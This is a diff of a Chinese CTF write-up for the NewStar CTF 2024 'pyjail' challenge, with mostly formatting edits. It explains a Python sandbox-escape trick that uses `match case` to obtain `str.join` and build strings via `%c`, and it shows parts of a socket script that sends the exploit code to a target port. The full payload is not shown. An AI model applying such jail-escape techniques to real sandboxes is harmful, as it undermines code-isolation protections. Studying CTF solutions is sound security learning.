@@ -4,9 +4,9 @@ titleTemplate: ':title | WriteUp - NewStar CTF 2024'
 
 # pyjail
 
-match case是python 3.10才有的语法，可以用来获取一个对象的属性
+`match case` 是 Python 3.10才有的语法，可以用来获取一个对象的属性
 
-```
+```python
 class Dog:
     def __init__(self, name):
         self.name = name
@@ -14,25 +14,25 @@ class Dog:
 def describe_pet(pet):
     match pet:
         case Dog(name=name1):
-            print(name1) # 这个位置会输出Rover，原因是pet对象的属性name被传给了name1
+            print(name1) # 这个位置会输出 Rover，原因是 pet 对象的属性 name 被传给了 name1
 
 pet = Dog("Rover")
 describe_pet(pet)
 ```
 
-str() 是一个空字符串对象，下面这部分等价于 bfc = ''.join([chr(37),chr(99),])，也就是 bfc=%c
+`str()` 是一个空字符串对象，下面这部分等价于 `bfc = ''.join([chr(37),chr(99),])`，也就是 `bfc=%c`
 
-```
+```python
 match str():
     case str(join=join):
         bfc = join(list((chr(37),chr(99),)))
 ```
 
-后面拿到了 %c，就可以使用 % 构造字符串
+后面拿到了 `%c`，就可以使用 `%` 构造字符串
 
-完整的 exp 如下：
+完整的 EXP 如下：
 
-```
+```python
 import socket,time
 code = \
 '''
@@ -70,9 +70,9 @@ EOF
 '''
 
 def send_messages(host, port):
-    # 创建一个TCP/IP套接字
+    # 创建一个 TCP/IP 套接字
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    
+
     try:
         # 连接到服务器
         print(f"正在连接到 {host}:{port}")
@@ -93,7 +93,7 @@ def send_messages(host, port):
 
     except Exception as e:
         print(f"发生错误: {e}")
-    
+
     finally:
         sock.close()
 
@@ -102,5 +102,4 @@ if __name__ == "__main__":
     target_port = 32808        # 替换为目标端口
 
     send_messages(target_host, target_port)
-
 ```
